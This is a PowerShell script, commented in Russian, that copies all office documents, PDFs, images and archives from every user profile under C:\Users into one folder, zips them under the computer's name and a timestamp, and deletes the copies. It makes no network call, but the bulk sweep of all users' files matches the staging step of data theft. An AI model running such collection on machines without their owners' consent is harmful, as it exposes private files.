$root = "C:\Users"
$destRoot = "C:\Papka"
$logPath = "C:\ЛОГИ"

$ext = @(
  "doc","docx","xls","xlsx","ppt","pptx",
  "pdf","txt","rtf","odt","ods","odp","csv",
  "jpg","jpeg","png","gif","tif","tiff","bmp",
  "zip","rar","7z"
)

New-Item -ItemType Directory -Path $destRoot -Force | Out-Null
New-Item -ItemType Directory -Path $logPath -Force | Out-Null

$items = Get-ChildItem -Path $root -File -Recurse -ErrorAction SilentlyContinue |
  Where-Object { $ext -contains $_.Extension.TrimStart('.').ToLowerInvariant() }

$copied = 0
foreach ($item in $items) {
  try {
    $rel = $item.FullName.Substring($root.TrimEnd('\').Length).TrimStart('\')
    $target = Join-Path $destRoot $rel

    New-Item -ItemType Directory -Path (Split-Path $target -Parent) -Force | Out-Null
    Copy-Item -LiteralPath $item.FullName -Destination $target -Force -ErrorAction Stop
    $copied++
  } catch {
    continue
  }
}

"Copied: $copied files to $destRoot"

# Создаем имя архива на основе имени компьютера, даты и времени
$computerName = $env:COMPUTERNAME
$dateTime = (Get-Date -Format "yyyy-MM-dd_HH-mm-ss")
$archiveName = "$computerName`_$dateTime.zip"  # Можно заменить .zip на .rar, если у вас есть WinRAR

# Создание архива с копированными файлами
$zipPath = Join-Path -Path $logPath -ChildPath $archiveName
Compress-Archive -Path $destRoot\* -DestinationPath $zipPath

# Удаление собранной папки после создания архива
Remove-Item -Path $destRoot -Recurse -Force

"Archive created: $zipPath"
